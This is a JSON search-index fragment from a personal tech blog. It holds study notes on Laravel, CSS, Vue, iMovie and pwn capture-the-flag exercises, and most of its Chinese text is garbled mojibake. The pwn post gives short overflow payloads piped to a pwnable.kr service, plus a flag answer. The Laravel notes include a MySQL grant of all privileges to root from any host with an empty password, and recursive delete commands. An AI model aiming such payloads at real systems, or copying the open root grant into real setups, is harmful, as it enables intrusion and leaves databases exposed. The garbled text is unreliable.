‰∏ÄÈîÆÂª∫Á´ãË°®Ôºöphp artisan migrate      8/1  composer dumpautoload ‰ºòÂåñËá™Âä®Âä†ËΩΩ„ÄÅÊèêÈ´òÊïàÁéá      RESTFUL          create =&gt; post      read =&gt; get      update =&gt; put/patch      delete =&gt; delete        Êñ∞Âª∫restfulÂØπË±°Ôºöphp artisan make:controller UsersController  php artisan list makeÁñëÊÉë  composer create-projectÂíålaravel newÁöÑÂå∫Âà´  Âú®‰∏çÂêåÁöÑÈ°πÁõÆÈáåÂàÜÂà´ÂÆâË£ÖhomesteadÔºåÈÅáÂà∞ÈÉ®ÂàÜÈÖçÁΩÆÊåâÁÖßÊÄªHomesteadÁöÑÔºåÈÉ®ÂàÜÊòØÁã¨Ëá™ÁöÑHomesteadÈÖçÁΩÆÁöÑÊÉÖÂÜµÔºå‰∏çÂ§™ÁêÜËß£„ÄÇ  [Â∑≤Ëß£ÂÜ≥]php artisan miagre:refreshÊä•Èîôtable existÔºõmysqlÊï∞ÊçÆÂ∫ìÁöÑmigrationË°®‰∏≠Ê≤°ÊúâÂØπÂ∫îÊñ∞Âª∫ÁöÑcreate_xxx_tableÈ°π„ÄÇ‰∏çÊâßË°åÂØπÂ∫îÊìç‰Ωú8/2  Êñ∞Âª∫È°πÁõÆÔºö          laravel new app      laravel new blog ‚Äìdev(Ëé∑ÂèñdevÁâà)      composer create-project ‚Äìprefer-dist laravel/laravel blog      rm -rf app (Âà†Èô§È°πÁõÆ)        routesÊñá‰ª∂Â§π:web.phpÂ≠òÂÇ®Ë∑ØÂæÑ  Êñ∞Âª∫mysqlÁî®Êà∑ÔºàÊùÉÈôê‰ºº‰πéÊúâÁÇπÈóÆÈ¢òÔºåÊó†Ê≥ï‰øÆÊîπmysql.userË°®Ôºâ          create database blog;      grant all privileges on . to root@‚Äô%‚Äô identified by ‚Äò‚Äô;      insert into user(Host,User,authentication_string) values(‚Äòlocalhost‚Äô,‚Äôroot‚Äô,password(‚Äò‚Äô));      grant usage on . to ‚Äòroot‚Äô@‚Äô%‚Äô identified by ‚Äò‚Äô with grant option;        php artisan migrateÂ∞ÜÊï∞ÊçÆÂ∫ìÁöÑË°®Ê†ºËΩ¨ÁßªÂà∞Êñ∞ÁöÑÊï∞ÊçÆÂ∫ì‰∏≠      Áªô‰∫àÊñ∞ÁöÑURIÂèÇÊï∞web.phpÔºö     Route::get('/', function () {     return view('welcome', [         'name' =&gt; 'world'  #return view('welcome')-&gt;with('name', 'worlld!');ÂäüËÉΩ‰∏ÄËá¥     ]); });            bladeÊñá‰ª∂‰∏≠ÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®@ËÄå‰∏çÊòØ&lt;?php ?&gt;Âú®html‰∏≠ÊèíÂÖ•PHP‰ª£Á†Å     &lt;ul&gt;     @foreach ($tasks as $task)     &lt;li&gt;\\{\\{\\$task\\}\\}&lt;/li&gt;     @endforeach &lt;/ul&gt;            Êñ∞Âª∫Êï∞ÊçÆÂ∫ìË°®php artisanÊü•ÁúãÊâÄÊúâÊåá‰ª§          php artisan make:migration create_tasks_table #Êñ∞Âª∫Âú®/database/migrations      ‰øÆÊîπÁîüÊàêÁöÑÊñá‰ª∂Ôºå‰ΩøÂæóÊï∞ÊçÆÂ∫ìÁöÑË°®ÁöÑË¶ÅÊ±ÇÈÄÇÂêàËá™Â∑±ÁöÑÈ°πÁõÆ„ÄÇÊ≥®ÊÑèË¶ÅËÆæÁΩÆ‰∏ªÈîÆÔºåÊàñËÄÖÁî®Ëá™Â∏¶ÁöÑid‰Ωú‰∏∫‰∏ªÈîÆ„ÄÇ      Ëã•Âà†Èô§‰∫ÜÊñá‰ª∂ÔºåÂèØ‰ª•‰ΩøÁî®composer dumpautoloadÈáçÊñ∞ÈÖçÁΩÆÔºåÂÜç‰ΩøÁî®Á¨¨‰∏ÄÊ≠•ÁöÑÂëΩ‰ª§ÁªßÁª≠„ÄÇ      ÁºñËæëÂÆåËæìÂÖ•php artisan migrateÂÆûÁé∞ÊääÂëΩ‰ª§ÂØπÂ∫îÂà∞Êï∞ÊçÆÂ∫ì‰∏≠„ÄÇ      Â¶ÇÊûúÂÜôÈîô‰∫Ü ‰ΩøÁî®php artisan migrate:refreshÂõûÊªöÈáçÊñ∞ÈÖçÁΩÆ„ÄÇ      mysql‰ΩøÁî®ÂΩìÂâçÊó∂Èó¥ \\func now()Ôºå‰πãÈó¥ËæìÂÖ•now()Êä•Èîô„ÄÇ      dd($id) dying dump ÁªàÊ≠¢Âπ∂ËæìÂá∫Ôºõ      print_r()      var_dump();die();            //Âà†Èô§Êñá‰ª∂Â§π‰∏ãÁöÑÊâÄÊúâ .git Êñá‰ª∂find . -name \".git\" | xargs rm -Rf    mysql5.7.19Êñ∞Âª∫Áî®Êà∑  create user ‚Äòtest‚Äô@‚Äô%‚Äô identified by ‚Äòpassword‚Äô;\t#Êñ∞Âª∫Áî®Êà∑  grant all on test.* to ‚Äòtest‚Äô@‚Äô%‚Äô;\t#Ëé∑ÂæóÊùÉÂà©  Delete FROM user Where User=‚Äôtest‚Äô and Host=‚Äôlocalhost‚Äô; #Âà†Èô§Áî®Êà∑  flush privileges;8/3  Êñ∞Âª∫Á±ªÔºöphp artisan make:model Student  php artisan tinker Áî®Êù•‰∫§‰∫íÊ£ÄÊü•Êåá‰ª§ÊêúÁ¥¢Êï∞ÊçÆÂ∫ìÂÜÖÂÆπÁöÑÊµãËØïshell \t* App\\Task::all() == DB::table(‚Äòstudents‚Äô)-&gt;get(); \t* App\\Task::where(‚Äòid‚Äô,‚Äô&gt;‚Äô,‚Äô3‚Äô)-&gt;get(); \t* App\\Task::pluck(‚Äòbody‚Äô); \t* Ê≥®ÊÑènamespaceÁöÑ‰ΩøÁî®8/4      seederËá™Âä®Â°´ÂÖÖÊï∞ÊçÆÂà∞mysqlÊï∞ÊçÆÂ∫ì          php artisan make:seeder StudentTableSeeder #Êñ∞Âª∫Êñá‰ª∂Âú®databases/seeds/Ë∑ØÂæÑ‰∏ã      composer dumpautoload              ‰øÆÊîπStudentTableSeederÊñá‰ª∂            for ($i=0; $i &lt; 10; $i++) {      DB::table('students')-&gt;insert([          // 'title'   =&gt; 'Title '.$i,          // 'slug'    =&gt; 'first-page',          // 'body'    =&gt; 'Body '.$i,          // 'user_id' =&gt; 1,          'student_id' =&gt; 'studnet'.$i,          'student_name' =&gt; 'student_name'.$i,          'class' =&gt; 'class'.$i,      ]);                    php artisan db:seed            ËÆæÁΩÆapiË∑ØÂæÑÔºåËÆøÈóÆÊó∂‰∏∫IP/api/info     Route::get('info',function () {     $students = DB::table('students')-&gt;get();     return $students; });            ÈÅáÂà∞VueÈÄöËøáaxiosËÆøÈóÆlaravelÊó∂Access-Control-Allow-OriginÁöÑÈóÆÈ¢òÔºåÈÄöËøáÂú®ÂêéÁ´ØÂ¢ûÂä†Êèí‰ª∂laravel-corsËß£ÂÜ≥ÔºàÊ≠§ÈóÆÈ¢òÈíàÂØπlaravel5.5ÁâàÊú¨Ôºâ„ÄÇÂÖ∑‰ΩìÈóÆÈ¢òÂèØ‰ª•Ê∑±Á©∂‰∏Ä‰∏ã„ÄÇ  9/11  Ê≥®ÊÑè‰øÆÊîπÈòøÈáå‰∫ëÊéßÂà∂Âè∞ÁöÑÂÆâÂÖ®ÁªÑÔºåËÆ©Â§ñÁΩëÂèØ‰ª•ËØ∑Ê±ÇÊúçÂä°Âô®„ÄÇ  ÂÆåÊàêballotÈ°πÁõÆÔºåÈÖçÁΩÆÊúçÂä°Âô®ÈÅáÂà∞ÈóÆÈ¢ò„ÄÇÊ†πÊçÆÊïôÁ®ãÈÅáÂà∞ÈóÆÈ¢ò502 NO Gateway„ÄÇÁ†îÁ©∂Âá∫Êñ∞ÁöÑÊñπÊ≥ïÔºöÂú®ubunut‰∏≠Ëã•ÊúçÂä°Âô®ÈÅáÂà∞ÈóÆÈ¢òÔºåÊü•Áúã/var/log/nginx/error.logÔºåÁúãÂà∞ÂÖ∑‰ΩìÊä•ÈîôÈóÆÈ¢ò„ÄÇËøôÊ¨°ÊòØ/etc/nginx/sites-available/defaultÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑfastcgi://unix:/var/run/php7.1-fpm.sock:‰ΩçÁΩÆÈîôËØØÔºå‰øÆÊîπ‰∏∫fastcgi://unix:/var/run/php/php7.1-fpm.sock:Ëß£ÂÜ≥ÈóÆÈ¢ò„ÄÇ  If a new extension is needed to be used, do not forget to add the path in /config/app.php.  Use a laravel extension to optimize the picture  Minimize the font package size, Using the tools"
  },
  
  {
    "title": "CSSÁü•ËØÜË°•ÂÖÖ",
    "url": "/posts/CSS%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/",
    "categories": "",
    "tags": "Website",
    "date": "2017-07-12 00:00:00 -0700",
    





    
    "snippet": "2018/71.ËØ≠Ê≥ïÔºöÈÄâÊã©È¢òÔºö{Â±ûÊÄßÔºöÂÄº}  ÂÄº‰∏∫Ëã•Âπ≤ÂçïËØçÂàôÂä†‰∏äÂèåÂºïÂè∑  Â§ö‰∏™Áî≥ÊòéÂàÜÂè∑ÂàÜÂâ≤2.Â±ûÊÄßÔºö  font-family\t\tÂ≠ó‰Ωì  font-style3.Ê¥æÁîüÈÄâÊã©Âô®Â∞ÜÊüêÂÖÉÁ¥†Â±ûÊÄßÂçïÁã¨ËÆæÁΩÆÂç≥ÂèØli strong {\tfont-style: italic;\tfont-weight: normal;}4.idÈÄâÊã©Âô®#red {color:red;}Áî®‰∫éÂª∫Á´ãÊ¥æÁîüÈÄâÊã©Âô®Ôºö#sidebar p {...",
    "content": "2018/71.ËØ≠Ê≥ïÔºöÈÄâÊã©È¢òÔºö{Â±ûÊÄßÔºöÂÄº}  ÂÄº‰∏∫Ëã•Âπ≤ÂçïËØçÂàôÂä†‰∏äÂèåÂºïÂè∑  Â§ö‰∏™Áî≥ÊòéÂàÜÂè∑ÂàÜÂâ≤2.Â±ûÊÄßÔºö  font-family\t\tÂ≠ó‰Ωì  font-style3.Ê¥æÁîüÈÄâÊã©Âô®Â∞ÜÊüêÂÖÉÁ¥†Â±ûÊÄßÂçïÁã¨ËÆæÁΩÆÂç≥ÂèØli strong {\tfont-style: italic;\tfont-weight: normal;}4.idÈÄâÊã©Âô®#red {color:red;}Áî®‰∫éÂª∫Á´ãÊ¥æÁîüÈÄâÊã©Âô®Ôºö#sidebar p {\tfont-style: italic;\ttext-align: right;\tmargin-top: 0.5em;}5.Á±ªClassÈÄâÊã©Âô®.center {text-align: center}6.Â±ûÊÄßÈÄâÊã©Âô®[title]{color:red;}7.Ê†∑ÂºèË°®      Â§ñÈÉ®Ê†∑ÂºèË°®      &lt;head&gt;  &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\" /&gt;  &lt;/head&gt;            ÂÜÖÈÉ®Ê†∑ÂºèË°®      &lt;head&gt;  &lt;style type=\"text/css\"&gt;    hr {color: sienna;}    p {margin-left: 20px;}    body {background-image: url(\"images/back40.gif\");}  &lt;/style&gt;  &lt;/head&gt;            ÂÜÖËÅîÊ†∑Âºè      &lt;p style=\"color: sienna; margin-left: 20px\"&gt;  This is a paragraph  &lt;/p&gt;      8.ËÉåÊôØ  background-color: gray;\t\tËÉåÊôØÈ¢úËâ≤  background-image: url(/i/xx.gif);\tËÉåÊôØÂõæÁâá  background-repeat: repeat-x/y; \t\tÊ®™Âêë/Á∫µÂêëÂπ≥Èì∫  background-position: top/bottom/left/right/center/50% 50%/50px 50px;\t\t\tËÉåÊôØ‰ΩçÁΩÆ  background-attachment:fixed\t\t\tËÉåÊôØÂú®ÂèØËßÜÂå∫Âõ∫ÂÆö9.ÊñáÊú¨  Áº©ËøõÊñáÊú¨(È¶ñË°åÁº©Ëøõ)Ôºö\tp {text-indent: 5em/20%;} ÁôæÂàÜÊØîÊòØÁõ∏ÂØπ‰∫éÁà∂ÂÖÉÁ¥†ÁöÑÂÆΩÂ∫¶ËÄåË®Ä  Ê∞¥Âπ≥ÂØπÈΩêÔºö\t\ttext-align: left/right/center(Âè™ÂΩ±ÂìçÊñáÊú¨)/&lt;CENTER&gt;(ËøòÂΩ±ÂìçÂÖÉÁ¥†Â±Ö‰∏≠)/justify      Â≠óÈó¥Èöî/Â≠óÊØçÈó¥ÈöîÔºö\t\tword-spacing/letter-spacing      p.tight {word-spacing: -0.5em;}  h1 {letter-spacing: -0.5em}  em:ÊòØÁΩëÈ°µÊµèËßàÂô®ÁöÑÂü∫Á°ÄÊñáÊú¨Â∞∫ÂØ∏ÁöÑÈ´òÂ∫¶        Â≠óÁ¨¶ËΩ¨Êç¢Ôºötext-transform:none/uppercase/lowercase/capitalize  ÊñáÊú¨Ë£ÖÈ•∞Ôºötext-decoration:none\\underline\\overline\\line-through\\blink  Á©∫ÁôΩÁ¨¶Ôºö p {white-space: normal;}10.Â≠ó‰Ωìfont-family:  ‰∫îÁßçÈÄöÁî®Â≠ó‰ΩìÔºö  Serif Â≠ó‰Ωì  Sans-serif Â≠ó‰Ωì  Monospace Â≠ó‰Ωì  Cursive Â≠ó‰Ωì  Fantasy Â≠ó‰Ωìfont-style:  ‰∏â‰∏™ÂÄºÔºö  normal - ÊñáÊú¨Ê≠£Â∏∏ÊòæÁ§∫  italic - ÊñáÊú¨Êñú‰ΩìÊòæÁ§∫  oblique - ÊñáÊú¨ÂÄæÊñúÊòæÁ§∫  Â≠ó‰ΩìÂèòÂΩ¢Ôºöfont-variant:  Â≠ó‰ΩìÂä†Á≤óÔºöfont-weight:normal(400)/bold/900(100~900)  Â≠ó‰ΩìÂ§ßÂ∞èÔºöfont-size:px/em/%11.ÈìæÊé•  4ÁßçÁä∂ÊÄÅ  a:link - ÊôÆÈÄöÁöÑ„ÄÅÊú™Ë¢´ËÆøÈóÆÁöÑÈìæÊé•  a:visited - Áî®Êà∑Â∑≤ËÆøÈóÆÁöÑÈìæÊé•  a:hover - Èº†Ê†áÊåáÈíà‰Ωç‰∫éÈìæÊé•ÁöÑ‰∏äÊñπ  a:active - ÈìæÊé•Ë¢´ÁÇπÂáªÁöÑÊó∂Âàªa:link {color:#FF0000;}\t\t/* Êú™Ë¢´ËÆøÈóÆÁöÑÈìæÊé• */a:visited {color:#00FF00;}\t/* Â∑≤Ë¢´ËÆøÈóÆÁöÑÈìæÊé• */a:hover {color:#FF00FF;}\t/* Èº†Ê†áÊåáÈíàÁßªÂä®Âà∞ÈìæÊé•‰∏ä */a:active {color:#0000FF;}\t/* Ê≠£Âú®Ë¢´ÁÇπÂáªÁöÑÈìæÊé• */12.ÂàóË°®  ÂàóË°®Á±ªÂûã ul {list-style-type: square}  ÂàóË°®È°πÂõæÂÉè ul li {list-style-image: url(xxx.gif)}  ÂàóË°®Ê†áÂøó‰ΩçÁΩÆ list-style-position:  ÁÆÄÂÜôÂàóË°®Ê†∑Âºè li {list-style : url(example.gif) square inside}13.Ë°®Ê†ºhtmlË°•ÂÖÖÔºötr‰∏ÄË°å„ÄÅtd‰∏ÄÈ°π      Ë°®Ê†ºËæπÊ°Ü    table, th, td    {    border: 1px solid blue;    }        ÊäòÂè†ËæπÊ°ÜÔºöÂ§öËæπÊ°ÜÊàñÂçïËæπÊ°Ü      table    {    border-collapse:collapse;    }\t  table,th, td    {    border: 1px solid black;    }        Ë°®Ê†ºÊñáÊú¨ÂØπÈΩê text-align/vertical-align:Ê∞¥Âπ≥/ÂûÇÁõ¥ÂØπÈΩê  Ë°®Ê†ºÂÜÖËæπË∑ù padding:15px;14.ËΩÆÂªìoutline-color/style/width15.Ë∞ÉËØïÈÄöËøáChromeÁöÑÊéßÂà∂Âè∞ËÆæÁΩÆCSSËøõË°åË∞ÉËØïÊñπ‰æøÊü•ÁúãCSSÂèòÂåñ„ÄÇ2019/1CSS Position: static/absolute/relative/fixed/sticky  static(default): The static postioned element will not be affected by the top, bottom, left, right properties.  relative: base on the normal position.  fixed: It is positioned relative to the viewport. It will stay in the same place while the page is scrolled.  absolute: It is positioned relative to the nearest ancestor. If it has no ancestor, it will take document body as an ancesotr.  sticky: It combines the relative and fixed."
  },
  
  {
    "title": "pwnËá™Â≠¶",
    "url": "/posts/pwn%E8%87%AA%E5%AD%A6/",
    "categories": "",
    "tags": "CTF",
    "date": "2017-06-27 00:00:00 -0700",
    





    
    "snippet": "pwn      Á¨¨‰∏ÄÈ¢ò     4660\tLETMEWIN            Á¨¨‰∫åÈ¢ò  python -c \"print '\\x01' * 16 + '\\xe8' + '\\x05' + '\\xD9' + '\\x1d'\"      Á¨¨‰∏âÈ¢òcat &lt;(python -c \"print '\\xbe\\xba\\xfe\\xca' * 14\") - | nc pwnable.kr 9000  ...",
    "content": "pwn      Á¨¨‰∏ÄÈ¢ò     4660\tLETMEWIN            Á¨¨‰∫åÈ¢ò  python -c \"print '\\x01' * 16 + '\\xe8' + '\\x05' + '\\xD9' + '\\x1d'\"      Á¨¨‰∏âÈ¢òcat &lt;(python -c \"print '\\xbe\\xba\\xfe\\xca' * 14\") - | nc pwnable.kr 9000     cat flag            ÈÄÜÂêëÁöÑÈ¢òÁõÆ:         * file filenameËé∑ÂæóÁ®ãÂ∫èÊòØx86ËøòÊòØx64ÁöÑ     * ‰ΩøÁî®strings filename | less Ëé∑ÂæóÁ®ãÂ∫è‰∏≠Â≠óÁ¨¶‰∏≤ÔºåÂà§Êñ≠ÊòØÂê¶Âä†Â£≥Ôºà‰ΩøÁî®upxÔºâ     * ÈÄöËøáupx -d filenameËÑ±Â£≥      "
  },
  
  {
    "title": "iMoiveËá™Â≠¶",
    "url": "/posts/iMovie%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/",
    "categories": "",
    "tags": "Skills",
    "date": "2017-06-22 00:00:00 -0700",
    





    
    "snippet": "6/22ÂÖ•Èó®ÊïôÁ®ãÔºöhttps://www.youtube.com/watch?v=UviYzKGFm4gÊÄªÁªì  Êà™ÂèñÁ¥†ÊùêÊó∂ÔºåÈÄöËøáiÂíåoÈÄâÊã©Êà™ÂèñÁâáÊÆµÁöÑÂºÄÂ§¥ÂíåÁªìÂ∞æ„ÄÇ  eÈîÆÔºåÈÄâ‰∏≠Á¥†ÊùêÁâáÊÆµÂêéÁõ¥Êé•ÊîæÂÖ•ËßÜÈ¢ëÂå∫  qÈîÆÔºåÈÄâ‰∏≠Á¥†ÊùêÁâáÊÆµÊîæÂÖ•ÂéüÊúâËßÜÈ¢ëÂâçÈù¢ÔºåË¶ÜÁõñËßÜÈ¢ë„ÄÇ  wÈîÆÔºåÈÄâ‰∏≠Á¥†ÊùêÁâáÊÆµÊîæÂÖ•ËßÜÈ¢ëÂå∫ÊåáÂÆö‰ΩçÁΩÆÔºåÂàáÊñ≠ÂéüÊúâÁöÑËßÜÈ¢ë„ÄÇ  ÈÖçÈü≥ËßÜÈ¢ëÔºåÂÖàÈÄâÊã©ÈÖçÈü≥ÔºåÊääbeatsÁî®mÈîÆÊ†áËÆ∞ÔºåÂÜçÊ†πÊçÆÊ†áËÆ∞Êà™ÂèñÁ¥†Êùê„ÄÇ  Ë£ÅÂâ™-Ken ...",
    "content": "6/22ÂÖ•Èó®ÊïôÁ®ãÔºöhttps://www.youtube.com/watch?v=UviYzKGFm4gÊÄªÁªì  Êà™ÂèñÁ¥†ÊùêÊó∂ÔºåÈÄöËøáiÂíåoÈÄâÊã©Êà™ÂèñÁâáÊÆµÁöÑÂºÄÂ§¥ÂíåÁªìÂ∞æ„ÄÇ  eÈîÆÔºåÈÄâ‰∏≠Á¥†ÊùêÁâáÊÆµÂêéÁõ¥Êé•ÊîæÂÖ•ËßÜÈ¢ëÂå∫  qÈîÆÔºåÈÄâ‰∏≠Á¥†ÊùêÁâáÊÆµÊîæÂÖ•ÂéüÊúâËßÜÈ¢ëÂâçÈù¢ÔºåË¶ÜÁõñËßÜÈ¢ë„ÄÇ  wÈîÆÔºåÈÄâ‰∏≠Á¥†ÊùêÁâáÊÆµÊîæÂÖ•ËßÜÈ¢ëÂå∫ÊåáÂÆö‰ΩçÁΩÆÔºåÂàáÊñ≠ÂéüÊúâÁöÑËßÜÈ¢ë„ÄÇ  ÈÖçÈü≥ËßÜÈ¢ëÔºåÂÖàÈÄâÊã©ÈÖçÈü≥ÔºåÊääbeatsÁî®mÈîÆÊ†áËÆ∞ÔºåÂÜçÊ†πÊçÆÊ†áËÆ∞Êà™ÂèñÁ¥†Êùê„ÄÇ  Ë£ÅÂâ™-Ken BurnsÂÆûÁé∞ÈïúÂ§¥Âú®‰∏Ä‰∏™ÂõæÂÉè‰∏äÁßªÂä®„ÄÇ"
  },
  
  {
    "title": "Vue Framework",
    "url": "/posts/Vue_Framework/",
    "categories": "",
    "tags": "Website",
    "date": "2017-06-19 00:00:00 -0700",
    





    
    "snippet": "6/190. Little Research  vue-cli has some different templates such as webpack, webpack-simple and so on. Use vue list to list all available official templates. The useful template I used is wepack w...",
    "content": "6/190. Little Research  vue-cli has some different templates such as webpack, webpack-simple and so on. Use vue list to list all available official templates. The useful template I used is wepack which is a full-featured version.  vue upload module: First the file handle need to be caught and then submit the post type method to connnect the server.  I have used a plugin to offer a editor for users to upload bulletins. Tinymce. The tinymce-vue is not free so I use a intergrated editor from others on the Internet.1. MVVMÊ®°ÂºèVue use MVVM model which means Model, View and Viewmodel. Model means data. View means UI and viewmodel means tha logic between them. View and viewmodel communicaates with each other by data binding. While viewmodel and model communicates with each other by notification.2. Vue.js Common commands  v-model: Âú®Ë°®ÂçïÂÖÉÁ¥†ÂàõÂª∫ÂèåÂêëÊï∞ÊçÆÁªëÂÆö&lt;input type=\"text\" v-model=\"message\"/&gt;  v-if: Êù°‰ª∂Ê∏≤ÊüìÊåá‰ª§ÔºåÂèØ‰ª•ÈÄöËøáÂ∏ÉÂ∞îÂèòÈáèÂà§Êñ≠„ÄÇ&lt;h1 v-if=\"yes\"&gt;Yes!&lt;/h1&gt;  v-show: Âè™Ê∏≤ÊüìcssÁöÑstyleÂ±ûÊÄßÔºåËøô‰∏™Ê†áÁ≠æ‰ºö‰∏ÄÁõ¥Â≠òÂú®‰∫éDOM‰∏≠ÔºåÂ¶ÇÊûúËÆæÁΩÆ‰∏∫falseÔºåÂè™ÊòØÊ†∑Âºè‰ºöÊ∂àÂ§±„ÄÇ  v-else: Ë∑üÂú®v-if/v-show‰πãÂêé„ÄÇ  v-for:Ê∏≤Êüì‰∏Ä‰∏™ÂàóË°®„ÄÇÂèØ‰ª•‰ΩøÁî®templateÊ†áÁ≠æÂÆûÁé∞Âè™Âæ™ÁéØÈáåÈù¢ÁöÑÂÜÖÂÆπ„ÄÇv-for=\"(i,index) in character\"„ÄÇ  v-bind:argument=‚Äùexpression‚Äù:argumentÂèØ‰ª•ÊòØclass„ÄÅsrcÁ≠âÔºåÂèÇÊï∞ÂèØ‰ª•‰ΩøÂêÑÁßçÂèòÈáèÔºåÈÄöËøáÁªëÂÆöÂèòÈáèÂç≥Êó∂ÂèçÂ∫îÂÄºÂæóÂèòÂåñ„ÄÇ  v-on:ÁõëÂê¨DOM‰∫ã‰ª∂Ôºå‰∫ã‰ª∂ÂèëÁîüÂêéÈÄöËøáÂ∏ÆÈ°∂‰∏Ä‰∏™ÊñπÊ≥ïÊàñËÄÖÂÜÖËÅîËØ≠Âè•ÂÆûÁé∞Ë∞ÉÁî®„ÄÇÂèØ‰ª•Áî®@ËøõË°åÁº©ÂÜô„ÄÇ  v-html:Áî®‰∫éÊèíÂÖ•‰∏ÄÊÆµÁ∫ØHTML‰ª£Á†Å„ÄÇ  this          this.$refsÂèØÁî®‰∫éÂ∞Ü      3.ÁªÑ‰ª∂3.1 Ê≠•È™§  ÂàõÂª∫ÁªÑ‰ª∂ÊûÑÈÄ†Âô®Vue.extend()  Ê≥®ÂÜåÁªÑ‰ª∂Vue.component()  ‰ΩøÁî®ÁªÑ‰ª∂3.2 ÂÖ®Â±ÄÊ≥®ÂÜåÂíåÂ±ÄÈÉ®Ê≥®ÂÜåÂÖ®Â±ÄÊ≥®ÂÜåÔºöVue.component()Â±ÄÈÉ®Ê≥®ÂÜåÔºöÂè™ËÉΩÂú®ÊåáÂÆöÂÆû‰æã‰∏≠‰ΩøÁî®new Vue({\tel: '#app',  \tcomponents: {   'my-component' : myComponent   }});3.3 Áà∂Â≠êÁªÑ‰ª∂var Parent = Vue.extend({// Âú®ParentÁªÑ‰ª∂ÂÜÖ‰ΩøÁî®&lt;child-component&gt;Ê†áÁ≠æ\ttemplate :'&lt;p&gt;This is a Parent component&lt;/p&gt;&lt;child-component&gt;&lt;/child-component&gt;',   components: {// Â±ÄÈÉ®Ê≥®ÂÜåChildÁªÑ‰ª∂ÔºåËØ•ÁªÑ‰ª∂Âè™ËÉΩÂú®ParentÁªÑ‰ª∂ÂÜÖ‰ΩøÁî®   'child-component': Child    }}) 3.4 ÁªÑ‰ª∂Ê≥®ÂÜåËØ≠Ê≥ïÁ≥ñÁÆÄÂåñËøáÁ®ãÔºöVue.componentsÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØÊ†áÁ≠æÂêçÁß∞ÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÊòØÈÄâÈ°πÂØπË±°„ÄÇËøôÁßçÊñπÂºèÂ∞ÜËá™Âä®Ë∞ÉÁî®Vue.extend()„ÄÇVue.component('my-component1',{template: '&lt;div&gt;This is the first component!&lt;/div&gt;'})var vm1 = new Vue({ \tel: '#app1'})        3.5 ‰ΩøÁî®propspropsÊääÁà∂ÁªÑ‰ª∂ÁöÑÊï∞ÊçÆ‰º†ÈÄíÁªôÂ≠êÁªÑ‰ª∂„ÄÇ  ÁªëÂÆöÁ±ªÂûã          ÂçïÈ°πÁªëÂÆöÔºöÁà∂ÁªÑ‰ª∂‰øÆÊîπ‰º†ÈÄíÁªôÂ≠êÁªÑ‰ª∂ÔºåÂ≠êÁªÑ‰ª∂‰øÆÊîπ‰∏çÂΩ±ÂìçÁà∂ÁªÑ‰ª∂      ÂèåÂêëÁªëÂÆö.syncÔºöÂ≠êÁªÑ‰ª∂‰øÆÊîπÁöÑÊï∞ÊçÆ‰ºöÂõû‰º†ÁªôÁà∂ÁªÑ‰ª∂      ÂçïÊ¨°ÁªëÂÆö.once:Áà∂ÁªÑ‰ª∂‰øÆÊîπ‰∏çÂΩ±ÂìçÂ≠êÁªÑ‰ª∂      7/7vue-cliÊòØ‰∏Ä‰∏™ËÑöÊâãÊû∂ÔºàÂç≥Â∑≤ÁªèÊê≠Âª∫Â•ΩÁöÑÊ°ÜÊû∂ÔºåÁõ¥Êé•Âú®ÂØπÂ∫îÊñá‰ª∂ÈáåÂ¢ûÂä†‰ª£Á†ÅÂç≥ÂèØË°•ÂÖÖÔºâ„ÄÇÂÖ∂‰∏≠Áà∂ÁªÑ‰ª∂ÊòØApp.vueÔºåÈáåÈù¢ÂàÜ‰∏∫template„ÄÅscriptÂíåstyleÂàÜÂà´ÂØπÂ∫îÈ°µÈù¢ÁâàÈù¢„ÄÅÊï∞ÊçÆÁªìÊûÑÔºàdataÔºâÊàñÁªÑ‰ª∂ÔºàcomponentÔºâÊàñÂáΩÊï∞ÔºàmethodÔºâÂíåCSS„ÄÇÂÖ∂‰ΩôÂ≠êÁªÑ‰ª∂ÊàøÂ≠êÂïä/scr/componentsÊñá‰ª∂Â§π‰∏ã„ÄÇ      ESlintÊòØQAÔºàquality assuranceÔºâË¥®Èáè‰øùËØÅÂ∑•ÂÖ∑ÔºåÁî®‰∫éÈÅøÂÖç‰ΩéÁ∫ßÈîôËØØÂíåÁªü‰∏Ä‰ª£Á†ÅÈ£éÊ†º„ÄÇÂ¶ÇÁº©ËøõÁ©∫2Ê†º„ÄÅÂáΩÊï∞ÂêçÂíåÊã¨Âè∑‰πãÈó¥Á©∫‰∏ÄÊ†ºÁ≠â„ÄÇÂÖ∑‰ΩìÊ†áÂáÜÔºöhttps://github.com/standard/standard/blob/master/RULES.md#javascript-standard-style        ÁªÑ‰ª∂Â∫îÁî®Ê®°Êùø     &lt;div id=\"app\"&gt;        \t\t\t  \t\t\t  \t\t\t\t  \t\t\t\t  \t\t\t  \t\t&lt;/div&gt;7/111.ÊûÑÈÄ†Âô®ÊãìÂ±ïÁªÑ‰ª∂Ôºövar MyComponent = Vue.extend({  // Êâ©Â±ïÈÄâÈ°π})// ÊâÄÊúâÁöÑ `MyComponent` ÂÆû‰æãÈÉΩÂ∞Ü‰ª•È¢ÑÂÆö‰πâÁöÑÊâ©Â±ïÈÄâÈ°πË¢´ÂàõÂª∫var myComponentInstance = new MyComponent()The squence to start a vue project is from index.html-&gt;main.js-&gt;App.vue.2.Â±ûÊÄß‰∏éÊñπÊ≥ïVueÂÆû‰æãÔºö‰ª£ÁêÜdataÂ±ûÊÄß„ÄÅ$data„ÄÅ$el„ÄÅ$watch3.ÂÆû‰æãÁîüÂëΩÂë®Êúü4.ËÆ°ÁÆóÂ±ûÊÄß  methodÂíåcomputedÁöÑÂå∫Âà´ÔºöÊØèÊ¨°ÈáçÊñ∞Ê∏≤ÊüìmethodÈÉΩ‰ºöÂÜçÊ¨°ÊâßË°åÁõ∏ÂÖ≥ÂáΩÊï∞ÔºõcomputedËÆ°ÁÆóÂ±ûÊÄß‰æùËµñÁºìÂ≠ò„ÄÇ  watchedÂíåcomputedÁöÑÂå∫Âà´ÔºöÊï∞ÊçÆË∑üÈöèÂÖ∂‰ªñÊï∞ÊçÆÂèòÂä®Êó∂ÔºåwatchedÊòØ‰ΩøÁî®ÂëΩ‰ª§ÂºèÂáΩÊï∞ÂõûË∞ÉÔºåcomputedÊòØÂàôÊòØÊûÑÈÄ†ÈÄöÁî®ÂáΩÊï∞ÔºåÊõ¥Âä†ÁÆÄÊ¥Å„ÄÇ  